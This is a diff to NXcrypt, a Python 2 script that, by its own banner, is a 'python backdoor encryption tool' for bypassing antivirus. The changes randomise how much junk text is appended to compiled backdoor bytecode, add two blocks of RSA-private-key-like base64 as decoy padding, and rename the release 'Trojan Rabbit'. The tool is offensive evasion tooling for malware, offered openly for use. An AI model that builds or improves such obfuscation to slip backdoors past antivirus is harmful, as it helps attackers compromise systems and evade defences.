@@ -1,9 +1,12 @@
-#! /usr/bin/env python
+#!/usr/bin/python2
 #! coding : utf-8
-""" usage :
 
-sudo ./nxcrypt.py --file=file_to_encrypt 
-sudo ./nxcrypt.py --file=file_to_encrypt --output=output_file
+""" 
+
+Usage :
+
+sudo ./nxcrypt.py --file=file_to_encrypt.py 
+sudo ./nxcrypt.py --file=file_to_encrypt.py --output=output_file.py
 sudo ./nxcrypt.py --help 
 
 """
@@ -16,6 +19,8 @@ import optparse
 import os
 import commands
 import time
+import random
+
 
 
 text = """
@@ -185,6 +190,68 @@ Paphius quin etiam et Cornelius senatores, ambo venenorum artibus pravis se poll
 '''
 
 """
+
+rsa = """
+
+'''
+
+MIICWgIBAAKBgHbARCDwIVdzyxi3I36sz1hFP3Rkz+Ac0AaP1kINmCcGuKsFd0K3
+UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDRNGr0KoQTpRcEYBjOf32tovof
+OSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O0w1ZSxz9KlSVzr0HAgMBAAEC
+gYAs0iTkyb3L5Eij63vaNB+OkZSBugs766QY1fFovPjQwhixdD6vT8JkrOc/G97N
+FSB/uBVbFehpopfbcjeguTMPPr7LwJbzwn4xD9u0AotzcO6JnB0k/D1Ixn3IYOY0
+o0wmKCq/4Gq6pzsjpJFTG6c5kCszMyQDbMmBWQmeM6ESAQJBALDWs4C07Rw/riCc
+KmlG1jtp9x1Uc8zfAlE9FXcdnfidYy/LUhpLtdZNZrHBZ+/P/LbX3kHQijXD7avd
+E3MP5NkCQQCr6NuKbRD0NnkTBuWrVPnAxBzO1E8VZF1rFKDXB7UHwtejwcUs3iUt
+CTGfr1l+3kj+0aNXCTvDBYxaIUxsmwTfAkAsxpA43JbU+kLKuv/6HBeOf6w0Xvfb
+PfRGQaM3v+YJ10AQD/k/8z+dfYetJn18uTsRyOLb40O7jVqWk6mjDrkxAkA5eNHc
+x3XBj2yO1eF2lCQjM+1FoGkIB9PLdswG14bIH3WkQ6W9yE65bbdvYVoUNhBFUKTA
+9k9KddJkV3mLXZAVAkACHbnraUo727FUodBf48TZkyz6DDOUh4BoJdGq2EDKYWr5
+ULGFBeItYZsaSlIc3VtfZdaXcRXRNIjbEOHPLGbb
+MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHbARCDwIVdzyxi3I36sz1hFP3Rk
+z+Ac0AaP1kINmCcGuKsFd0K3UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDR
+NGr0KoQTpRcEYBjOf32tovofOSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O
+0w1ZSxz9KlSVzr0HAgMBAAE=
+
+'''
+
+"""
+
+
+rsa1 = """
+
+'''
+
+MIIEpQIBAAKCAQEAmDmgQAXKaHyTUVf3h/skxS3zVrsdT/8vK9hIl+swQ66sUAqw
+ZJDhSX7HposlKgdz6TtVzWLZr/s1m1lJCzCGFbxTHA+w7dsG0qkuhAdZzx1mTHXk
+Uhs0sNMq/PsWTGzBJAJvKtqY+/c1IOKKadt5EBxm9RPnK6BAktD+vr9XnNODGjr1
+8yqEOmFELHrwpNNKa8NLqxYiCiQV58DE/5NO0V/OqNLlkwR8KNM9BooeTYRG+A3J
+2ZfKIrvhFLVXiVRRn/p2ZwB23hFJMT91UOVbvJa5Gpm2RrIe9rUxuF6srD8fnkOU
+CJh4FbPJleHZyC7KYOOhAcjPNCu5NI4a5H2oCQIDAQABAoIBAC9FHcUjxzHhFWIa
+HeylCUsNtNXG7xhLVtuXoxtB1k/+KtYEK7he4QaQjvDhnp3JiK3xVficbJrgOEpQ
+VIVcARc4ztoU6U1DSYAbNy2alsHhEEZICamRdzA9ssiyM79xuhwzgU/eZ8k+f8oB
+bxfmJlbhavtJvexnLAYrTh/vjQZOkXomAYSQJya72CfpDxWkiPEOJjBSSib2j9yY
+0x5F/M8eVhB48LNvoPvbkW/FsnlJAerKIOYQZQA8NgZkBpCbanVnJ0XT10M68+lT
+Wa+8+fZcsSnby6Arkr0MkJdeSJdeAYrWpLoqJyEozhUJvxgtjdIJM81bf2Sl+zJr
+WcMIjPECgYEAxh81bnaQ+19V1S0gWaHxQzbnqtwNZ47YrZnB9bkkvrBtYvRR1ev9
+170Dt7c0AomyY50mP4efp3ZgJJ2OYWSg0exB6kgblIj89rFQWGJwMQrWoSSqK1Fk
+WswFKzfI7qrdnB8Xzvly3lI+alJd2HYSO9xvo8A05ly8/lxVEE/aO20CgYEAxLH3
+yMp7X4jGykNN31IJR9TGznPt5BcuFmL+eT6X/EIquRuHLCb6TzDR1OT6LSMWxPqS
+dVKx97hH4gT7gDSAPNVGS1NFx+PQMPwzdLIYG/9eW+GyPPRu7SEmEs489V75uTmB
+PRFGNwM5M94Khpx8AgmkSHKiDT523t3Thk4dgY0CgYEAvkJKNYJ3SG8NJmLnpiv2
+XO3lHBemZ8SuIEiAE1FxEA6tfVHTJPQ0GXHSmCK/N5C0VyUbDfdYQqFTQtZrXOwd
+5HpV8n68va+v/dfZqIcf5njaFHX5VRAcp3U1oYM42roLh1n0qzayMP4aIlBm/vCk
+IghWzZJPOsnkVQCmT7vffyECgYEAhu9L+9wkPMqZDSKU5nHh2fw3EmRnO0VHoaXx
+yv1MyIofwvMGjRyENRVZrYITuilLMoBvPrsnSbiK35vpaO8bViA9Y+lRgqpfJWuu
+ZQzUC0jp04CGhNhuzJAkDVycZvvrtsyjQ2B5Wb4FXPajI+twCvnQUL8LOqiyZXup
+44XtKfUCgYEAs8DsRxHqL/nu9akH5MWKqxKsH1oeUeMTL0MLkBpJKkLnAu/pSQz9
+y41V0jYgz7hO9Voiv1xaFRlXbhP75RzaEwDf5afDDJbsU1jsXMmcXvcAEGUG3s6p
+NcPjjBvjld4EM+nuFCY6C62819jmD/jQ2FzA5hMiPne4tGb+JLO5cAg=
+
+'''
+
+"""
+stringo = [rsa,rsa1,lorem,text]
 _output_ = "backdoor.py" # edit this line is you want edit default output .
 _byte_ = (_output_) + "c"
 
@@ -208,17 +275,23 @@ d8b   db db    db  .o88b. d8888b. db    db d8888b. d888888b
 88 V8o88  .dPYb.  8b      88`8b      88    88~~~      88
 88  V888 .8P  Y8. Y8b  d8 88 `88.    88    88         88
 VP   V8P YP    YP  `Y88P' 88   YD    YP    88         YP
-                                        (python backdoor encryption tool)                                      
+                                        (python backdoor encryption tool) 
+
+                                        Version 2.0
+                                        Codename 'Trojan Rabbit'
+
+
        """
 menu_linux = "\033[32m" + (menu) + "\033[37m"
       
 name = """
  -NXcrypt is a tool for bypass AV 
- -It encrypt python backdoors   and payloads in bytecode
- -author: Hadi Mene (H4d3s)
-
+ -It encrypt 'python backdoors' in bytecode
+ -Author: Hadi Mene (H4d3s)
+- Suspicious Shell Activity Labs
  
 	   """
+	   
 name_linux = "\033[31m" +  (name) + "\033[37m"
 
 #options 
@@ -258,10 +331,10 @@ elif  option.file :
 			os.system(" mv {}  {} ".format(_byte_,_output_))
 		ok =  open(_output_,'a')
 		d = 1
-		p = 6
+		p = random.randint(9,20)
+
 		while (d) != (p) :
-			ok.write(lorem)
-			ok.write(text)
+			ok.write(random.choice(stringo))
 			d += 1
 		print ("[+] encryption finished  100% ")
 		print time.strftime('[*] time : %H:%M ',time.localtime()) 
@@ -284,10 +357,10 @@ elif  option.file :
 			os.system("mv {}  {} ".format(bytecode,output))	
 		ok =  open(_output_,'a')
 		d = 1
-		p = 6
+		p = random.randint(9,20)
+
 		while (d) != (p) :
-			ok.write(lorem)
-			ok.write(text)
+			ok.write(random.choice(stringo))
 			d += 1
 		print ("[+] encryption finished 100% ")
 		print time.strftime('[*] time : %H:%M ',time.localtime()) 
